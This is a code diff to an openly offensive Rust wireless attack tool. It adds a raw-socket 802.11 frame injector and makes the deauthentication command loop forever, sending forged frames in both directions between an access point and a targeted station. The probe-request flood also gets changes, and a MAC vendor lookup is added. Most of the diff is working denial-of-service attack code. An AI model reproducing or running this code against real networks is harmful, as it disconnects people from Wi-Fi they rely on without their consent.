@@ -27,6 +27,8 @@ mod captive_portal;
 mod port_scanner;
 mod pbkdf2_sha1;
 mod offensive;
+pub mod oui_lookup;
+pub mod raw_injector;
 
 use clap::{Parser, Subcommand};
 use std::ffi::CString;
@@ -277,7 +279,7 @@ enum Commands {
         host: String,
     },
 
-    /// Send raw 802.11 deauthentication frames
+    /// Send raw 802.11 deauthentication frames (infinite until Ctrl+C)
     #[command(name = "deauth")]
     Deauth {
         /// Interface to transmit from
@@ -289,9 +291,6 @@ enum Commands {
         /// Target station MAC (broadcast if omitted)
         #[arg(short = 's', long = "station")]
         station: Option<String>,
-        /// Number of deauth frames to send
-        #[arg(short = 'c', long = "count", default_value_t = 10)]
-        count: u32,
     },
 
     /// Broadcast fake 802.11 beacon frames
@@ -466,6 +465,14 @@ enum Commands {
         count: u32,
     },
 
+    /// Look up vendor name by MAC address OUI
+    #[command(name = "oui-lookup")]
+    OuiLookup {
+        /// MAC address to look up (e.g., B4:B0:24:82:F7:3C)
+        #[arg(short = 'm', long = "mac", required = true)]
+        mac: String,
+    },
+
     /// Airodump-ng style — real-time AP and station discovery with signal bars
     #[command(name = "airodump")]
     Airodump {
@@ -488,9 +495,30 @@ enum Commands {
 }
 
 fn inject_frames(iface: &str, frames: &[Vec<u8>], label: &str) {
+    let total = frames.len();
+    let count = total as u32;
+
+    // Try raw AF_PACKET socket first (real, no pcap needed)
+    #[cfg(target_os = "linux")]
+    {
+        match raw_injector::RawSocket::open(iface) {
+            Ok(sock) => {
+                let delay_ms = if count > 100 { 0 } else { 10 };
+                let sent = sock.send_burst(&frames[0], count, delay_ms).unwrap_or(0);
+                if sent > 0 {
+                    ok!("{} injection: {}/{} frames sent via raw socket", label, sent, count);
+                    return;
+                }
+            }
+            Err(e) => {
+                info_log!("Raw socket failed ({}), trying pcap...", e);
+            }
+        }
+    }
+
+    // Fall back to pcap
     match pcap_wrapper::open_capture(iface) {
         Ok(mut session) => {
-            let total = frames.len();
             for (i, frame) in frames.iter().enumerate() {
                 if pcap_wrapper::send_packet(&mut session, frame) {
                     info_log!("{} frame #{}/{} ({} bytes) ✓", label, i+1, total, frame.len());
@@ -846,16 +874,39 @@ async fn main() {
                 None     => warn!("Could not determine OS for {}", host),
             }
         }
-        Commands::Deauth { interface, bssid, station, count } => {
+        Commands::Deauth { interface, bssid, station } => {
             let station_mac = station.as_deref().unwrap_or("FF:FF:FF:FF:FF:FF");
-            section!("Deauth: {} → {} ({} frames on {})", bssid, station_mac, count, interface);
-            match capture_engine::build_deauth_frame(bssid, station_mac, 7) {
-                Some(frame) => {
-                    let frames = vec![frame; *count as usize];
-                    inject_frames(interface, &frames, "DEAUTH");
+            section!("Deauth: {} → {} (infinite on {}, Ctrl+C to stop)", bssid, station_mac, interface);
+            #[cfg(target_os = "linux")]
+            match raw_injector::RawSocket::open(interface) {
+                Ok(sock) => {
+                    let targeted = station_mac != "FF:FF:FF:FF:FF:FF";
+                    let mut seq = 0u16;
+                    let mut sent = 0u64;
+                    while running.load(Ordering::SeqCst) {
+                        for _ in 0..50 {
+                            if !running.load(Ordering::SeqCst) { break; }
+                            if let Some(frame) = capture_engine::build_deauth_frame(bssid, station_mac, 7) {
+                                let _ = sock.send(&frame);
+                                sent += 1;
+                            }
+                            if targeted {
+                                if let Some(frame) = capture_engine::build_deauth_frame(station_mac, bssid, 7) {
+                                    let _ = sock.send(&frame);
+                                    sent += 1;
+                                }
+                            }
+                        }
+                        if sent % 500 == 0 {
+                            info_log!("Deauth {}: {} sent", bssid, sent);
+                        }
+                    }
+                    ok!("Deauth complete: {} frames sent → {}", sent, bssid);
                 }
-                None => err!("Invalid MAC addresses provided."),
+                Err(e) => err!("Raw socket failed: {}", e),
             }
+            #[cfg(not(target_os = "linux"))]
+            err!("Deauth requires Linux AF_PACKET sockets");
         }
         Commands::BeaconFlood { interface, ssid, bssid, channel, count } => {
             let ssid_str = ssid.clone().unwrap_or_else(generate_random_ssid);
@@ -996,8 +1047,13 @@ async fn main() {
         }
         Commands::ProbeFlood { interface, count } => {
             section!("Probe request flood: {} frames on {}", count, interface);
-            let _ = aggressive_scanner::probe_request_flood(interface, "HackIT", *count);
+            let ssid = format!("PROBE_{}", std::time::SystemTime::now().duration_since(std::time::UNIX_EPOCH).unwrap_or_default().as_millis() % 10000);
+            let _ = aggressive_scanner::probe_request_flood(interface, &ssid, *count);
             ok!("Probe flood complete");
+        }
+        Commands::OuiLookup { mac } => {
+            let vendor = oui_lookup::oui_lookup(mac);
+            println!("  {}  {}", mac, vendor);
         }
         Commands::Airodump { interface, dwell_ms, band_5ghz, channel, channel_count } => {
             section!("Airodump-ng style capture on {} — Ctrl+C to stop", interface);
